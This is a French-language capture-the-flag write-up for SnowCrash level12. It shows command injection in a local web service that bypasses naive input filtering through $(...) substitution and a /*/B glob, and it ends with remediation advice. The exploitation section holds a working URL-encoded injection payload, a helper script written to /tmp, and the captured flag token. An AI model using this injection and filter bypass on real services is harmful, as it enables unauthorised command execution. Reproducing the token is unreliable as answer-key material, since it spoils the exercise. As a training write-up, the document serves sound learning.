# SnowCrash - level12 writeup

## Objectif

Exploiter le service web de level12 pour exécuter une commande arbitraire et récupérer le token via getflag.

## Recon

Le service écoute en local sur le port 4646 et prend un paramètre x via HTTP.

Test simple :

```
curl "localhost:4646?x=test"
```

Le paramètre est interprété côté serveur dans une commande shell.

## Analyse

Le script applique un filtrage naïf sur l’entrée utilisateur (ex: suppression de caractères ou transformation en majuscules), mais exécute toujours la commande via un shell.

Le pattern suivant permet de contourner le filtrage :

- $(...) pour forcer une substitution de commande
- /\*/B pour contourner les filtres sur les chemins explicites

## Exploitation

Création d’un script exécutable contenant getflag :

```
echo "getflag>/tmp/H" > /tmp/B
chmod 777 /tmp/B
```

Injection via la requête HTTP :

```
curl "localhost:4646?x=%24%28%2F%2A%2FB%29"
```

Récupération du token :

```
cat /tmp/H
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

## Résultat

- Vulnérabilité - > Command Injection via service web
- Technique - > Bypass de filtrage par substitution de commande
- Token getflag - > fa6v5ateaw21peobuub8ipe6s

## Notes

- Le filtrage par blacklist est inefficace face aux expansions shell
- Correction : ne jamais passer d’entrée utilisateur à un shell (utiliser exec sans shell, ou whitelist stricte)
- $(...) et les glob patterns sont des vecteurs classiques de bypass
